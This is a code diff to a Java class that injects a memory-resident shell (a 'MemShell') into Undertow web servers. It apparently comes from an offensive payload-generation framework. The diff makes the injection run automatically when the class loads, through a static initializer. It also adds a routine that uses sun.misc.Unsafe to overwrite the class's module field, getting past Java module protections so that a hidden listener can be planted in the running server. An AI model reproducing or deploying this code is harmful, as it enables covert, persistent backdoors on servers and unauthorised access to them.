@@ -4,6 +4,7 @@ import com.ppp.annotation.JavaClassModifiable;
 import com.ppp.annotation.JavaClassType;
 import com.ppp.annotation.MemShell;
 import com.ppp.annotation.Middleware;
+import sun.misc.Unsafe;
 
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
@@ -25,7 +26,9 @@ import java.util.zip.GZIPInputStream;
 public class UndertowListenerThreadLoader {
     private static String gzipObject;
     private static String CLASSNAME;
-
+    static {
+        new UndertowListenerThreadLoader();
+    }
     public UndertowListenerThreadLoader() {
         try {
             // 获取 ServletRequestContext
@@ -38,6 +41,7 @@ public class UndertowListenerThreadLoader {
     }
 
     public static void inject(Object servletRequestContext) throws Exception {
+        addModule();
         Object deployment = getFieldValue(servletRequestContext, "deployment");
         Object applicationListeners = getFieldValue(deployment, "applicationListeners");
         ArrayList allListeners = (ArrayList) getFieldValue(applicationListeners, "allListeners");
@@ -169,6 +173,25 @@ public class UndertowListenerThreadLoader {
         method.setAccessible(true);
         Object object = method.invoke(obj, args);
         return object;
+    }
+
+    public static void addModule() {
+        try {
+            Class unsafeClass = Class.forName("sun.misc.Unsafe");
+            Field unsafeField = unsafeClass.getDeclaredField("theUnsafe");
+            unsafeField.setAccessible(true);
+            Unsafe unsafe = (Unsafe) unsafeField.get(null);
+            Method method = Class.class.getDeclaredMethod("getModule");
+            method.setAccessible(true);
+            Object module = method.invoke(Object.class);
+            Class cls = UndertowListenerThreadLoader.class;
+            long offset = unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));
+            Method getAndSetObjectMethod = unsafeClass.getMethod("getAndSetObject", Object.class, long.class, Object.class);
+            getAndSetObjectMethod.setAccessible(true);
+            getAndSetObjectMethod.invoke(unsafe, cls, offset, module);
+        } catch (Exception e) {
+
+        }
     }
 
 }
